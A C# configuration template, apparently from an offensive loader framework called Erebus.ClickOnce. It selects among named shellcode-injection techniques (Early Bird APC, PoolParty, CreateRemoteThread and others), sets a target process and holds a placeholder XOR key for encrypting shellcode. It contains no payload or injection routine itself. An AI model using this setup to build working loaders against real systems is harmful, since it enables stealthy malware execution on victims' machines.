using System.Runtime.Versioning;

namespace Erebus.ClickOnce
{
    [SupportedOSPlatform("windows")]
    public static class InjectionConfig
    {
        // ============================================
        // INJECTION CONFIGURATION
        // ============================================
        
        /// <summary>
        /// Select injection method:
        /// - "createfiber"    : Fiber-based self-injection
        /// - "earlycascade"   : Early Bird APC injection (remote)
        /// - "poolparty"      : Worker Factory thread pool injection (remote)
        /// - "classic"        : Classic CreateRemoteThread injection (remote)
        /// - "enumdesktops"   : EnumDesktops callback injection (self)
        /// </summary>
        public static string InjectionMethod = "{{ INJECTION_METHOD }}";

        /// <summary>
        /// Target Process ID for remote injection methods.
        /// Set to 0 to create a new process automatically.
        /// Only applies to: earlycascade, poolparty, classic
        /// </summary>
        public static int TargetPID = 0;

        /// <summary>
        /// Target process name for remote injection (when TargetPID = 0)
        /// </summary>
        public static string TargetProcess = "{{ TARGET_PROCESS }}";

        /// <summary>
        /// XOR encryption key for shellcode
        /// Leave empty for no encryption
        /// </summary>
        public static byte[] EncryptionKey = new byte[] { {{ ENCRYPTION_KEY }} };
    }
}
